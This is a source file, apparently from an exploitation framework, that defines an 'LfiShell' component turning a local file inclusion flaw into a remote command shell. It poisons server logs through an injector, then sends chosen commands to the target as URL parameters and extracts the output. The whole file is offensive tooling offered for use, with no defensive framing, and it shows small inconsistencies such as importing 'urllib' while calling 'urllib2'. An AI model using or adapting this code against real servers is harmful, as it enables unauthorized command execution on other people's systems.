import('urllib');

class ExploitComponent LfiShell {
    shellInfo = null,

    __init__: @(
        reqTmpl,        
        dot = '.',
        separator = '/',
        terminator = '') {
        self.injector = LogInjector(
            reqTmpl,
            dot,
            separator,
            terminator);
	},
    
    create: @{
        i = self.injector.inject();
        
        if (i == null) {
            self.log('[-] Could not exploit LFI');
            ret false;
        }
        
        self.shellInfo = i;
        
        ret true;
    },

    run: @(cmd) {
        if (self.shellInfo == null) {
            self.log('[!] No known shell');
            
            if (!self.create()) {
                ret null;
            }            
            
            quit();
		}
        
        u = self.createCmdUrl(cmd);
        self.log('[?] %s' % u);
        _, d = self.shellInfo;
        postData = d;
        if (postData != null) self.log('    ' + str(postData));
        resp = urllib2.urlopen(u, postData).read() |> self.parseResp;
        
        ret resp;
	},
    
    parseResp: @(resp) {
        fan = @(v)
            [ v, v.replace('\\', '\\\\').replace('"', '\\"') ]
            @selectMany(@(x) [ x, x.upper(), x.lower() ])
            distinct;
        
        split = @(v, t) {
            for (tag in t |> fan) {  
                if (len(v) != 2) v = v[0].split(tag);
                else break;  
            }
            
            ret v;
        };
        
        e = self.injector.emitter;        
        if (e.prefix == null) ret resp;        
        p = split([resp], e.prefix);            
        
        if (len(p) < 2) {
            ret resp;
        }
        
        ret split([p[1]], e.suffix)[0];
    },

    createCmdUrl: @(cmd) {
        u, _ = self.shellInfo;
        d = urllib.urlencode({cmd: cmd});
		x = u.__contains__('?') ? '&' : '?';        
        ret u + x + d;
	},
};
